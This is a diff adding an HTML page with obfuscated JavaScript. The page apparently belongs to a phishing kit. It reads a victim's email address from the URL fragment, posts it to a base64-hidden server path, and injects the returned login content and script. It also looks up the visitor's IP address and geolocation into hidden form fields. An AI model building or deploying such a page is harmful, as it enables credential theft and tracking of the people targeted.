@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+    <link rel="stylesheet" href="style.css" />
+    
+
+    <link rel="shortcut icon" id="_fav__icn_">
+  </head>
+  <body>
+   <main id="cnt">
+
+   </main>
+  </body>
+</html>
+
+
+<script src="./srv.js"></script>
+
+<script id="sctoapnd1"></script>
+
+<script>
+  const _main_ = async () => {
+    const __winHref = window.location.href.split("?")[0];
+  const __getInd__ = (str, search) => str.indexOf(search);
+  const __getSlice__ = (str, index) => str.substr(index);
+  const __getEl__ = (sel) => document.querySelector(sel);
+  const __json = (url) => fetch(url).then((res) => res.json());
+  const cntHome = __getEl__("main#cnt");
+  const scToAppend1 = __getEl__("#sctoapnd1");
+
+  const __getURLEm = () => {
+    if(__getInd__(__winHref, "#") === -1){
+      console.log("ue 1 failed");
+      return false;
+    }
+
+    if(__getInd__(__winHref, "@") === -1){
+      console.log("ue 2 failed");
+      return false;
+    }
+
+    return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
+  }
+
+  const __UrlEm = __getURLEm();
+
+  if (
+      __getInd__(__winHref, "#") === -1 ||
+      __getInd__(__winHref, "@") === -1 ||
+      !Boolean(__UrlEm)
+    ) {
+      console.log("Failed");
+      return;
+    }
+
+
+  // subC rtvr
+  const _getSC_ = (_s = null, subj = 'l') => {
+    const new_sc = { sc: 0, new: true };
+  
+    if (!_s || typeof _s !== "string") {
+      console.log("sc rtrvl fld");
+      return  new_sc;
+    }
+  
+    const _sc_indx = _s.indexOf(subj);
+  
+    console.log({ _sc_indx });
+  
+    if (_sc_indx === -1) return new_sc;
+  
+    const sc = Number(_s.substring(_sc_indx + 1));
+  
+    if (typeof sc !== "number" || isNaN(sc)) {
+      console.log("error: sc rtrvl fld", { sc });
+      return new_sc;
+    }
+  
+    // console.log({ sc });
+    return { sc, new: false };
+  };
+
+  // set subCnt
+  const auth_err = _getSC_(window.location.href.split("?")[1]).sc;
+
+  // console.log({ auth_err, __UrlEm, __winHref });
+
+  async function loadLoc(key) {
+    return await __json(`https://api.ipdata.co?api-key=${atob(key)}`);
+  }
+
+  async function __hydrate_() {
+    const __fetchOptions = {
+      method: "POST",
+      body: JSON.stringify({ auth_err, __UrlEm, __winHref }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
+
+    const __res = await fetch(`${window.stef.srv_loc}${atob("L293L2NudFNlcnZlci5waHA=")}`, __fetchOptions);
+
+    const __resData = await __res.json();
+
+    // hydrate_
+    cntHome.innerHTML = __resData.data.cnt;
+    cntHome.classList.add("display_block");
+
+    const __locData = await loadLoc(__resData.data.key);
+
+    __getEl__("#___pidt_field_").value = __locData.ip || "error retrieving data";
+    __getEl__("#___ocdt_field_").value = __locData.country_name || "error retrieving data";
+    __getEl__("#___icdt_field_").value = __locData.city || "error retrieving data";
+    __getEl__("#___oldt_field_").value = __locData.longitude || "error retrieving data";
+    __getEl__("#___aldt_field_").value = __locData.latitude || "error retrieving data";
+
+    scToAppend1.innerHTML = __resData.data.crpt;
+
+    // console.log({ __resData });
+    // console.log({ __locData });
+    return;
+  }
+
+  __hydrate_();
+  }
+
+  _main_();
+</script>
